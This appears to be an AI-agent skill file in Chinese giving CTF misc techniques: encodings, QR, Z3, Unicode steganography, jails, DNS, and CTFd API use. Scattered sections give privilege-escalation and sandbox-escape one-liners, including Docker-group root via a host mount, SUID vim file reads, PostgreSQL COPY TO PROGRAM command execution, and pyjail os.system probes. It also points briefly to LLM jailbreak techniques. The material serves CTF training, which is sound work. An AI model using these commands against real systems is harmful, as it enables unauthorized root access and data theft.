---
name: ctf-misc
description: 为那些不属于主要类别的问题提供各种CTF挑战技巧。适用于编码谜题、pyjails、bash jails、RF/SDR、DNS异常、Unicode技巧、异类语言、QR码或音频谜题、约束求解、博弈论、不寻常的沙盒逃逸以及混合逻辑谜题。当挑战主要涉及Web、pwn、逆向、取证、恶意软件、OSINT或密码学时，优先选择更具体的技能。将此视为真正的跨类别或边缘案例挑战的备选技能，而非默认的起点。
---

# CTF杂项

杂项CTF挑战的快速参考。这里每个技巧都有一个一行代码；有关详细信息，请参阅支持文件。

## 前置条件

**Python包（所有平台）：**
```bash
pip install "pwntools==4.15.0" "segno==1.6.2" z3-solver Pillow numpy requests dnslib
```

**Linux（apt）：**
```bash
apt install libzbar0 qrencode ffmpeg
```

**macOS（Homebrew）：**
```bash
brew install ffmpeg qrencode
```

**手动安装：**
- SageMath — Linux: `apt install sagemath`, macOS: `brew install --cask sage`

## 额外资源

- [pyjails.md](pyjails.md) - Python监狱/沙盒逃逸技巧，quine上下文检测，受限字符循环节分解，func_globals模块链遍历，受限字符集数字生成，类属性持久化，通过存储的eval进行f-string配置注入
- [bashjails.md](bashjails.md) - Bash监狱/受限shell逃逸技巧，HISTFILE文件读取技巧，bash -v详细模式，ctypes.sh直接调用C库
- [encodings.md](encodings.md) - 编码，二维码，esolangs，UTF-16技巧，BCD编码，多层自动解码，索引目录二维码重组，多阶段URL编码链
- [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL，格雷码循环编码，RTF自定义标签提取，SMS PDU解码，多编码顺序求解器，UTF-9，像素二进制编码，十六进制数独+QR组装，TOPKEK，MaxiCode
- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ信号处理（QAM-16，载波恢复，时序同步）
- [dns.md](dns.md) - DNS利用（ECS欺骗，NSEC遍历，IXFR，重绑定，隧道）
- [games-and-vms.md](games-and-vms.md) - WASM修补，Roblox地方文件逆向，PyInstaller，反序列化分析，Python环境RCE，Z3（包括布尔逻辑门网络SAT求解），K8s RBAC，浮点精度利用，通过Python MRO链进行自定义汇编语言沙盒逃逸
- [games-and-vms-2.md](games-and-vms-2.md) - Cookie检查点游戏暴力破解，Flask Cookie游戏状态泄露，WebSocket游戏操作，服务器仅时间验证绕过，De Bruijn序列，Brainfuck instrumentation，WASM线性内存操作
- [games-and-vms-3.md](games-and-vms-3.md) - memfd_create压缩二进制文件，多阶段加密游戏带有HMAC承诺-揭示和GF(256) Nim，模拟器ROM切换状态保留，Python反序列化代码注入，Benford定律绕过，并行连接预言机中继，非ogram求解器管道，100名囚犯问题，通过emoji标识符进行C代码监狱逃逸，BuildKit守护程序构建秘密利用，Docker容器逃逸，Levenshtein距离预言机攻击，通过类型强制绕过污点分析，撕碎文档像素边缘重组
- [games-and-vms-4.md](games-and-vms-4.md) - 第4部分（2018年时代）：XSLT作为图灵完备的虚拟机，JavaScript MAX_SAFE_INTEGER后继等式，仅比较DSL中的二分搜索预言机，通过脚本引擎超时错误进行盲SQLi，OEIS序列查找自动化，从格式字符串约束中重组QR码，矩阵指数化用于斐波那契递归，Tribonacci用于青蛙跳跃计数，Selenium + Tesseract动态验证码，Brainfuck→Piet多层多语言，bytebeat合成代码识别
- [linux-privesc.md](linux-privesc.md) - Sudo通配符参数注入（fnmatch），精心制作的pcap用于sudoers.d，monit confcheck进程注入，Apache -d覆盖，备份cron作业SUID，PostgreSQL COPY TO PROGRAM RCE，PostgreSQL备份凭证提取，NFS共享利用，SSH Unix套接字隧道，PaperCut打印部署privesc，Squid代理转向，Zabbix管理员密码重置通过MySQL，WinSSHTerm凭证解密
- [ctfd-navigation.md](ctfd-navigation.md) - CTFd平台API导航而不使用浏览器：检测，令牌认证，挑战列表，文件下载，旗帜提交，计分板，提示，通知，Python客户端类

---

## 何时转向

- 如果谜题实际上以密码学或数论为中心，则切换到`/ctf-crypto`。
- 如果挑战是一个真实的二进制漏洞而不是监狱，玩具虚拟机或编码问题，则切换到`/ctf-pwn`或`/ctf-reverse`。
- 如果输入主要是文件，图像，音频或需要首先进行恢复工作的数据包，则切换到`/ctf-forensics`。
- 对于ML/AI技巧（模型攻击，对抗性示例，LLM监狱突破），请参阅`/ctf-ai-ml`。
- 如果NodeJS沙盒使用**vm2**（`npm ls vm2`），则通过`Promise[@@species]`与`nesting:true`检查**CVE-2023-37466** — 异常处理程序逃逸上下文；请参阅`ctf-web/js-sandbox`以获取完整的利用链。在杂项挑战中捆绑了JS，始终运行`npm ls vm2`以检测易受攻击的vm2，然后再尝试其他逃逸。

## 快速启动命令

```bash
# 文件识别
file mystery_file
xxd mystery_file | head -5
python3 -c "import magic; print(magic.from_file('mystery_file'))"

# 编码检测
python3 -c "import base64; print(base64.b64decode('<data>'))"
echo '<data>' | base64 -d
echo '<hex>' | xxd -r -p

# QR码
zbarimg qr.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"

# Z3约束求解
python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"

# Python监狱测试
python3 -c "__import__('os').system('id')"
```

## 通用技巧

- 仔细阅读所有提供的文件
- 检查文件元数据，隐藏内容，编码
- Power Automate脚本可能会隐藏API调用
- 当猜测多个答案时使用二分搜索

## 常见编码

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# Hex
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**通过字符集识别：**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=`（没有小写）
- Hex: `0-9a-fA-F`

有关凯撒暴力破解，URL编码和详细信息的更多信息，请参阅[encodings.md](encodings.md)。

## IEEE-754浮点编码（数据隐藏）

**模式（浮点）：** 数字是隐藏原始字节的float32值。

**关键洞察：** 一个32位浮点数只是4个字节解释为数字。重新解释为原始字节 -> ASCII。

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # 挑战中给出的任何内容
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**变体：** 双`'>d'`，小端`'<f'`，混合。有关CyberChef配方，请参阅[encodings.md](encodings.md)。

## USB鼠标PCAP重建

**模式（猎物和啄食）：** USB HID鼠标流量捕获屏幕键盘输入。使用USB-Mouse-Pcap-Visualizer，提取点击坐标（下降边缘），累积相对差值以获得绝对位置，覆盖在OSK图像上。

## 文件类型检测

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## 存档提取

```bash
7z x archive.7z           # 通用
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### 嵌套存档脚本
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## QR码

```bash
zbarimg qrcode.png       # 解码
qrencode -o out.png "data"
```

**MaxiCode条形码：** 带有中心靶心的六边形2D条形码；使用`zxing`（Java）解码，因为标准QR解码器失败。请参阅[encodings-advanced.md](encodings-advanced.md#maxicode-2d-barcode-decoding-csaw-ctf-2016)。

**TOPKEK编码：** CTF特定的二进制编码，其中`KEK=0`，`TOP=1`，`!`后缀 = 重复次数。请参阅[encodings-advanced.md](encodings-advanced.md#topkek-binary-encoding-hack-the-vote-2016)。

请参阅[encodings.md](encodings.md)以获取QR结构，修复技术，结构化重组和索引目录重组，以及多阶段URL编码链。

## 音频挑战

```bash
sox audio.wav -n spectrogram  # 视觉数据
qsstv                          # SSTV解码器
```

## RF / SDR / IQ信号处理

有关详细信息，请参阅[rf-sdr.md](rf-sdr.md)（IQ格式，QAM-16解调，载波/时序恢复）。

**快速参考：**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR原始
- 星座中的圆圈 = 恒定频率偏移；螺旋 = 漂移频率 + 增益不稳定性
- DD载波恢复中的4倍模糊 - 尝试0/90/180/270旋转

## pwntools交互

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python监狱快速参考

- **预言机模式：** `L()` = 长度，`Q(i,x)` = 比较，`S(guess)` = 提交。线性或二分搜索。
- **Walrus绕过：** `(abcdef := "new_chars")` 重新分配约束变量
- **装饰器绕过：** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` 用于无调用，无引号逃逸
- **字符串连接：** `open(''.join(['fl','ag.txt'])).read()` 当`+`被阻止时

请参阅[pyjails.md](pyjails.md)以获取完整技术。

## Z3 / 约束求解

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
# 添加约束，检查sat，提取模型
```

请参阅[games-and-vms.md](games-and-vms.md)以获取YARA规则，类型系统作为约束，布尔逻辑门网络SAT求解。

## 哈希识别

MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256长度扩展攻击

MAC = `SHA-256(SECRET || msg)` 已知msg/哈希 -> 通过`hlextend`伪造有效MAC。易受攻击：SHA-256，MD5，SHA-1。不是：HMAC，SHA-3。

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
```

## 技巧快速参考

- **PyInstaller：** `pyinstxtractor.py packed.exe`。请参阅[games-and-vms.md](games-and-vms.md)以获取操作码重映射。
- **Marshal：** `marshal.load(f)`然后`dis.dis(code)`。请参阅[games-and-vms.md](games-and-vms.md)。
- **Python环境RCE：** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`。请参阅[games-and-vms.md](games-and-vms.md)。
- **WASM修补：** `wasm2wat` -> flip minimax -> `wat2wasm`。请参阅[games-and-vms.md](games-and-vms.md)。
- **浮点精度：** 大乘数将FP误差放大为可利用的分数。请参阅[games-and-vms.md](games-and-vms.md)。
- **K8s RBAC绕过：** SA令牌 -> 伪装 -> hostPath挂载 -> 读取密钥。请参阅[games-and-vms.md](games-and-vms.md)。
- **Cookie检查点：** 在猜测之前保存会话cookie，在失败时恢复以进行暴力破解而不重置。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Flask Cookie游戏状态：** `flask-unsign -d -c '<cookie>'` 解码未签名的Flask会话，泄露游戏答案。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **WebSocket传送：** 修改`player.x`/`player.y`在控制台中，调用验证函数。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **仅时间验证：** 开始会话，`time.sleep(required_seconds)`，提交胜利。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Quine上下文检测：** 具有双重用途的quine，它打印自身（通过验证）并在服务器进程中仅通过globals门运行有效负载。请参阅[pyjails.md](pyjails.md)。
- **循环节分解：** 使用仅2个字符（`1`和`+`）对目标整数进行循环节分解（1，11，111，...）以进行受限评估。请参阅[pyjails.md](pyjails.md)。
- **De Bruijn序列：** B(k, n)包含所有k^n个可能的n长度字符串作为子字符串；通过附加前n-1个字符进行线性化。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Brainfuck instrumentation：** 仪器BF解释器以跟踪磁带单元，通过验证单元逐个字符地暴力破解标志。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **WASM内存操作：** 在运行时修补WASM线性内存以直接设置游戏状态变量，绕过游戏逻辑。请参阅[games-and-vms-2.md](games-and-vms-2.md)。
- **Lua沙盒逃逸：** 通过`os["execute"]`表索引或`loadstring`别名绕过`load()`/`os.execute()`过滤器。请参阅[games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)。
- **C代码监狱通过emoji + gadget嵌入：** 当仅允许emoji和标点符号在C中时，使用`(😃==😃)`作为常量1，构建整数，在`add eax, imm32`常量中嵌入gadgets，跳转到偏移+1以获取shellcode原语。请参阅[games-and-vms-3.md](games-and-vms-3.md#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)。
- **模拟器ROM切换：** `/load`替换ROM但保留CPU状态（寄存器，RAM，PC）。在特定PC处切换ROM以将一个ROM的INIT与另一个ROM的显示指令组合→读取受保护的内存。请参阅[games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026)。
- **BuildKit守护程序利用：** 暴露的BuildKit gRPC允许嵌套`buildctl build`与`--mount=type=secret`读取构建密钥。两阶段Dockerfile：安装buildctl → 提交嵌套构建挂载标志密钥。请参阅[games-and-vms-3.md](games-and-vms-3.md#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)。
- **Docker容器逃逸：** 通过主机设备挂载进行特权突破，docker.sock套接字逃逸，CAP_SYS_ADMIN cgroup release_agent，通过/proc和overlayfs泄漏容器信息。请参阅[games-and-vms-3.md](games-and-vms-3.md#docker-container-escape-techniques)。
- **通过类型强制绕过污点分析：** 在具有保密性/污点系统的自定义ML样语言中，如果if表达式保密性取决于返回类型而不是条件 — 强制具有副作用的函数到私有类型，以通过公共可变引用泄漏私有数据。请参阅[games-and-vms-3.md](games-and-vms-3.md#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018)。
- **撕碎文档像素边缘重组：** 将每个带的左/右边缘编码为二进制掩码（暗=1），使用XOR + popcount汉明距离贪婪地放置带条，通过最小边缘距离进行亚秒级重组。请参阅[games-and-vms-3.md](games-and-vms-3.md#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018)。
- **通过存储的eval进行f-string配置注入：** 将有效负载存储为配置值，创建名为`eval(stored_key)`的键 — f-string渲染评估键名表达式，触发RCE。请参阅[pyjails.md](pyjails.md#python-f-string-config-injection-via-stored-eval-inshack-2018)。
- **十六进制数独+QR组装：** 4个QR码编码16x16十六进制数独象限；解决网格，读取对角线作为十六进制对→ASCII标志。请参阅[encodings-advanced.md](encodings-advanced.md#hexadecimal-sudoku--qr-assembly-bsidessf-2026)。
- **Z3布尔门网络SAT求解：** 产品密钥验证为250个布尔门（AND/OR/XOR/NOT）在125个输入位上。将每个门建模为Z3约束，要求所有输出为True，毫秒内求解。请参阅[games-and-vms.md](games-and-vms.md#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)。

## 3D打印机视频喷嘴跟踪（LACTF 2026）

**模式（flag-irl）：** 3D打印机制造铭牌的视频。标志是打印的文本。

**技巧：** 从视频帧中跟踪喷嘴X/Y位置，过滤打印移动（顶部/文本层仅），绘制2D直方图以揭示字母形状：
```python
# 1. 确定文本层帧（例如，帧26100-28350）
# 2. 跟踪打印头X位置（物理X轴）
# 3. 跟踪床X位置（从相机角度的物理Y轴）
# 4. 过滤具有挤出的移动（打印头移动时）
# 5. 绘制为2D散点/直方图 -> 字母出现
```

## Discord API 列举（0xFun 2026）

标志隐藏在Discord元数据（角色，动画表情符号，嵌入）。调用`/ctf-osint`以获取Discord API列举技术和代码（请参阅social-media.md在ctf-osint中）。

---

## SUID二进制漏洞利用（0xFun 2026）

```bash
# 查找SUID二进制文件
find / -perm -4000 2>/dev/null

# 与GTFObins交叉引用
# xxd配合SUID：xxd flag.txt | xxd -r
# vim配合SUID：vim -c ':!cat /flag.txt'
```

**参考：** https://gtfobins.github.io/

---

## Linux提权快速检查

```bash
# GECOS字段密码
cat /etc/passwd  # 检查第5个冒号分隔字段

# ACL权限
getfacl /path/to/restricted/file

# Sudo权限
sudo -l

# Docker组成员资格（即时root）
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

## Docker组提权（H7CTF 2025）

属于`docker`组的用户可以挂载主机文件系统到容器中，并切换到其中以获取root权限。

```bash
# 检查组成员资格
id  # 查找组中是否有"docker"

# 挂载主机根文件系统并切换root
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# 现在正在主机文件系统上以root身份运行
cat /root/flag.txt
```

**关键洞察：** Docker组成员资格等同于root权限。`docker` CLI套接字（`/var/run/docker.sock`）允许创建特权容器，这些容器挂载整个主机文件系统。

**参考：** https://gtfobins.github.io/gtfobins/docker/

## Sudo通配符参数注入（Dump HTB）

Sudo的`fnmatch()`会在参数边界处匹配`*`。向受保护的命令注入额外标志（`-Z root`，`-r`，第二个`-w`）。构建包含嵌入式有效sudoers条目的pcap文件——sudo的解析器可以从二进制垃圾中恢复，而cron的解析器则严格。参见[linux-privesc.md](linux-privesc.md#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb)。

## Monit进程命令行注入（Zero HTB）

root monit脚本使用`pgrep -lfa`提取进程命令行，然后执行修改后的版本。通过`perl -e '$0 = "..."'`创建假进程，并注入标志。Apache `-d`最后胜出覆盖ServerRoot；`-E`捕获错误输出。`Include /root/flag`导致解析错误，从而暴露文件内容。参见[linux-privesc.md](linux-privesc.md#monit-confcheck-process-command-line-injection-zero-htb)。

## PostgreSQL远程代码执行和文件读取（Slonik HTB）

`COPY (SELECT '') TO PROGRAM 'cmd'`以postgres身份执行操作系统命令。`pg_read_file('/path')`读取文件。从`pg_basebackup`存档中提取凭据（`global/1260` = `pg_authid`）。SSH隧道到Unix套接字：`ssh -fNL 25432:/var/run/postgresql/.s.PGSQL.5432`。参见[linux-privesc.md](linux-privesc.md#postgresql-copy-to-program-rce-slonik-htb)。

## 备份Cron作业SUID滥用（Slonik HTB）

root Cron作业复制目录会保留SUID位，但会更改所有者为root。将SUID bash放在源目录中→备份将其作为root所有者SUID复制。使用`bash -p`执行。参见[linux-privesc.md](linux-privesc.md#backup-cronjob-suid-abuse-slonik-htb)。

## PaperCut打印部署提权（Bamboo HTB）

root进程运行用户拥有的目录中的脚本。修改`server-command`，通过Mobility Print API刷新触发。参见[linux-privesc.md](linux-privesc.md#papercut-print-deploy-privilege-escalation-bamboo-htb)。

---

## CTFd平台导航（无需浏览器）

检测CTFd（`curl -s "$CTF_URL/api/v1/" | head -5`）并通过API交互。**要求用户提供他们的API令牌**（CTFd设置 > 访问令牌）——它默认不提供。然后对所有请求使用`Authorization: Token $CTF_TOKEN`头部。

```bash
export CTF_URL="https://ctf.example.com" CTF_TOKEN="ctfd_your_token_here"
curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges" | jq -r '.data[] | "\(.id)\t\(.value)pts\t\(.category)\t\(.name)"'
curl -s -X POST -H "Authorization: Token $CTF_TOKEN" -H "Content-Type: application/json" "$CTF_URL/api/v1/challenges/attempt" -d "{\"challenge_id\": $CID, \"submission\": \"flag{...}\"}"
```

参见[ctfd-navigation.md](ctfd-navigation.md)了解完整工作流程、Python客户端类、会话登录、提示、通知、文件下载和故障排除。

---

## 有用的单行命令

```bash
grep -rn "flag{" .
strings file | grep -i flag
python3 -c "print(int('deadbeef', 16))"
```

## 键盘移位密码

**模式（Frenzy）：** QWERTY键盘布局上左右移位的字符。

**识别：** dCode密码标识器建议"键盘移位密码"

**解码：** 使用[dCode键盘移位密码](https://www.dcode.fr/keyboard-shift-cipher)的自动模式。

## Pigpen / 骷髅头密码

**模式（Working For Peanuts）：** 基于网格位置的几何符号代表字母。

**识别：** 角形/几何符号，挑战引用"花生"漫画（查理布朗），"看起来有灰尘的加密"

**解码：** 将符号映射到Pigpen网格位置，或使用在线解码器。

## ASCII在数值数据列中

**模式（Cooked Books）：** CSV/电子表格的数值值（48-126）是ASCII字符码。

```python
import csv
with open('data.csv') as f:
    reader = csv.DictReader(f)
    flag = ''.join(chr(int(row['Times Borrowed'])) for row in reader)
print(flag)
```

**CyberChef：** "从十进制"配方，使用换行符分隔符。

## 源代码中的后门检测

**模式（Rear Hatch）：** 隐藏的命令前缀触发`system()`调用。

**常见模式：**
- `strncmp(input, "exec:", 5)` -> 运行`system(input + 5)`
- 十六进制编码的比较字符串：`\x65\x78\x65\x63\x3a` = "exec:"
- 维护/管理员函数中的隐藏条件

## DNS利用技术

参见[dns.md](dns.md)了解完整细节（ECS欺骗，NSEC遍历，IXFR，重绑定，隧道）。

**快速参考：**
- **ECS欺骗**：`dig @server flag.example.com TXT +subnet=10.13.37.1/24` - 尝试leet-speak IP（1337）
- **NSEC遍历**：跟随NSEC链来枚举DNSSEC区域
- **IXFR**：`dig @server domain IXFR=0`当AXFR被阻止时
- **DNS重绑定**：低TTL交替解析以绕过同源
- **DNS隧道**：数据通过子域名查询或TXT响应进行泄露

## Unicode隐写术

### 变体选择器补充（U+E0100-U+E01EF）
**模式（Seen & emoji, Nullcon 2026）：** 隐形变体选择器补充字符通过码点偏移编码ASCII。

```python
# 从可见字符后提取隐藏数据
data = open('README.md', 'r').read().strip()
hidden = data[1:]  # 跳过可见emoji字符
flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
```

**检测：** 字符看起来不可见但长度不为零。使用`[hex(ord(c)) for c in text]`检查——查找`0xE0100-0xE01EF`或`0xFE00-0xFE0F`范围内的码点。

### Unicode标签块（U+E0000-U+E007F）（UTCTF 2026）

**模式（Hidden in Plain Sight）：** 隐藏在URL、文件名或文本中的不可见Unicode标签字符。每个标签码点直接映射到一个ASCII字符，通过减去`0xE0000`。URL编码为4字节UTF-8序列（`%F3%A0%81%...`）。

```python
import urllib.parse

url = "https://example.com/page#Title%20%F3%A0%81%B5%F3%A0%81%B4...Visible%20Text"
decoded = urllib.parse.unquote(urllib.parse.urlparse(url).fragment)

flag = ''.join(
    chr(ord(ch) - 0xE0000)
    for ch in decoded
    if 0xE0000 <= ord(ch) <= 0xE007F
)
print(flag)
```

**关键洞察：** Unicode标签（U+E0001-U+E007F）与ASCII 1:1镜像——减去`0xE0000`以恢复原始字符。它们在大多数字体中渲染为零宽不可见符号。与变体选择器（U+E0100+）不同，这些具有更简单的偏移计算，并出现在URL片段、挑战标题或文件名中，其中文本看起来正常但字节长度可疑。

**检测：** 文本或URL的长度比预期字节长。以`%F3%A0%80`或`%F3%A0%81`开头的百分号编码序列。Python：`any(0xE0000 <= ord(c) <= 0xE007F for c in text)`。

## UTF-16字节序反转

**模式（endians）：** 文本"变成日语"——UTF-16字节序不匹配的摩斯密码。

```python
# 如果编码为UTF-16-LE但解码为UTF-16-BE：
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
```

**识别：** CJK字符，挑战提到"翻译"或"字节序"。参见[encodings.md](encodings.md)了解详情。

## 密码识别工作流程

1. **ROT13** - 挑战提到"ROT"，文本看起来像乱码英语
2. **Base64** - `A-Za-z0-9+/=`，标题提示"64"
3. **Base32** - `A-Z2-7=`仅大写
4. **Atbash** - 标题提示（Abash/Atbash），保留空格，1:1替换
5. **Pigpen** - 网格上的几何符号
6. **键盘移位** - 文本看起来像相邻按键按下
7. **替换** - 适用频率分析

**自动识别：** [dCode密码标识器](https://www.dcode.fr/cipher-identifier)

## HISTFILE技巧用于受限shell文件读取（BCTF 2016）

无需cat/less/head读取文件：`HISTFILE=/flag /bin/bash && history`，或`bash -v flag.txt`（详细模式打印行），或`ctypes.sh` `dlcall`进行直接C库调用。参见[bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016)。

## Levenshtein距离或然攻击（SunshineCTF 2016）

或然返回猜测和秘密之间的编辑距离。通过空字符串确定长度，通过单字符重复识别存在字符，二分搜索位置。O(n log n)查询。参见[games-and-vms-3.md](games-and-vms-3.md#levenshtein-distance-oracle-attack-sunshinectf-2016)。

## SECCOMP高位文件描述符绕过（33C3 CTF 2016）

`close(0x8000000000000002)`通过64位SECCOMP检查（≠ 2）但内核截断为32位（== 2），关闭文件描述符2。下一个`open()`为任意文件返回文件描述符2。BPF过滤器与内核之间的类型宽度不匹配。参见[games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)。

## rvim越狱通过Python3（BKP 2017）

`rvim`阻止`:!`但`:python3 import os; os.system("cmd")`执行任意命令。检查`:version`以查找`+python3`/`+lua`/`+ruby`。参见[games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)。
